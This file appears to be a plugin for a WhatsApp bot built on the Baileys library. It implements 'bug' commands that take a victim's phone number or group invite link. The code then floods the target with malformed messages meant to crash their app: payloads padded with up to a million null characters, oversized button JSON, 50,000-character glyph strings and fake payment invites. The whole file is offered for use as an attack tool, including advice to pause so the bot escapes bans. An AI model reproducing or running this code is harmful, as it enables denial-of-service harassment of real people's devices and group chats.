const util = require("util")
const { makeWaSocket, useMultiFileAuthState, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require("@whiskeysockets/baileys")
let handler = async(m, { conn, usedPrefix, command, args, text }) => {
	command = command.toLowerCase()
	let from = m.key.remoteJid
function nezximun(jid, count) {
	for (let i = 0; i < count; i++) {
		conn.sendMessage(jid, { text: '.\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA\n\nTANDAI TELAH DIBACA', mentions: [m.sender]}, {quoted: m })
	}
}
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
//BUG FUNCTION
const sendReaction = async reactionContent => {
  conn.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   conn.sendMessage(recipientJid, {
      'text': ''.repeat(50000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function NezzxViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"ྦྷ\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    conn.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(1000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "S̸Y꙰̸S꙰̸T꙰̸E꙰̸M꙰̸ U̸I̸ C̸R꙰̸A꙰̸S꙰̸H꙰̸" + "\0".repeat(920000),
      'footerText': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'description': "ຮ₮ཞศV꙰ศ ๖ມG꙰ཀ͜͡✅⃟╮",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await conn.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  conn.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': '؂ن؃؄ٽ؂ن؃؄ٽ' + 'ꦾ'.repeat(50000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  conn.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 86400000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function NezzxMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function NezzxVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendSystemCrashMessage(jid);
    sendLiveLocationMessage(jid);
    await sleep(500);
  }
}

async function NezzxRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function NezzxMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    await sleep(500);
  }
}

function NezzxMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return conn.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return conn.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
//CASE BUG
switch (command) {
case "xandroid": {
  if (!text) return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  }
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await conn.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "628222353746") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  }
  m.reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  NezzxVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  NezzxMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*🔎\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  //if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  }
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await conn.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "628223537406") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  }
  m.reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  NezzxMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  NezzxMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*🔎\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
    if (!text){
      return m.reply(`Example usage: ${usedPrefix + command} 5`)
      }
    if (isNaN(parseInt(text))) {
      return m.reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    m.reply("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    NezzxMultiplePaymentInvites(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('');
  }
  break;
  case "xandroid2":
  {
	/*if (!isPremium) return replygcxeon(mess.prem)
    if (!isBot) {
      return m.reply("*This feature is for the bot only!*");
    }*/
    if (!text){
      return m.reply(`Example usage: ${usedPrefix + command}, 5`)
      }
    if (isNaN(parseInt(text))) {
      return m.reply("Amount must be a number");
    }
    let encodedValue = encodeURI(text) * 5 // Adjusted calculation for clarity
    m.reply("please wait, " + command + " bug is in process..");
    await sleep(1500); // Adjusted sleep time for clarity
    NezzxVariousMessages(from, encodedValue);
    await sleep(2500); // Adjusted sleep time for clarity
    sendReaction('😜');
  }
  break;
  case "virloc" : {
  	if (!text) return m.reply(`Example usage: ${usedPrefix + command} 62xxxxxxxx`)
      let number = args[0]
      if (isNaN(parseInt(text))) {
      return m.reply("Amount must be a number");
      }
      let cleanedNumber = number.replace(/[^0-9]/g, '');
      let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
      m.reply("please wait, " + command + " bug is in process..");
      await sleep(2000)
      sendSystemCrashMessage(whatsappNumber)
      await sleep(2000)
      NezzxMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*🔎\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
  }
  break
  case "xgc":
  {
    //if (!isPremium) return replygcxeon(mess.prem)
    if (!text) {
      return m.reply("*HOW TO SEND BUG TO GROUP*\n\n" + (usedPrefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
    }
    m.reply("please wait, " + command + " bug is in process..");
    if (!text.split(" ")[0].includes("whatsapp.com")) {
      return m.reply("Link Invalid!");
    }
    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
    try {
      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
      let groupTarget = await conn.groupAcceptInvite(groupLink);
      await sleep(2000); // Adjusted sleep time for clarity
      NezzxViewOnceMessages(groupTarget, bugAmount);
      await sleep(2500); // Adjusted sleep time for clarity
      m.reply("*DONEâœ… BUG HAS BEEN SENT TO THE GROUP!.*");
      conn.groupLeave(groupTarget);
    } catch (error) {
      m.reply(util.format(error));
    }
  }
  break;
  case "systemuicrash": {
  //if (!isPremium) return replygcxeon(mess.prem)
  if (!text) return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  }
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await conn.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "628222353406") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  }
  m.reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  NezzxMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  NezzxMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "🔍\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xsysui": {
  //if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply(`Use ${usedPrefix+command} victim number, amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return m.reply(`Use ${usedPrefix+command} victim number|amount\nExample ${usedPrefix+command} 62xxxxxxxxxx, 5`) 
  }
  if (isNaN(parseInt(amount))) {
    return m.reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await conn.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6282223537406") {
    return;
  }
  if (contactInfo.length == 0) {
    return m.reply("The number is not registered on WhatsApp");
  }
  m.reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  NezzxRepeatedMessages2(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  NezzxMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "🔍\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case 'clearall': {
//if (!isCreator) return replygcxeon(mess.owner)
conn.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
case 'clearchat': {
	if (!args[0]) {
		return nezximun(m.chat, 3)
	} else {
        return nezximun(args[0], 3)
    }
}
break
}
}

handler.help = ["xandroid", "xios", "systemuicrash", "xsysui", "clearall", "clearchat"]
handler.tags = ["bug"]
handler.command = /^(xandroid2?|xios2?|xgc|systemuicrash|xsysui|virloc|clearall|clearchat)$/i
handler.rowner = true

module.exports = handler